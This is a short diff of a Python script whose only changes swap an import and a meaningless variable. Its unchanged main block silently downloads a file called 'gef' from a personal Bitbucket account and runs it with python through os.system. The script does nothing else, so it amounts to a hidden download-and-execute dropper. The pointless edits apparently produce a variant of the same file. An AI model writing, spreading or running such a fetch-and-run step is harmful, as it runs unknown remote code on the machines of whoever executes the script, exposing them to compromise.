@@ -1,4 +1,4 @@
-import os, sys,mailbox
-c=8
+import os, sys,argparse
+i=14
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
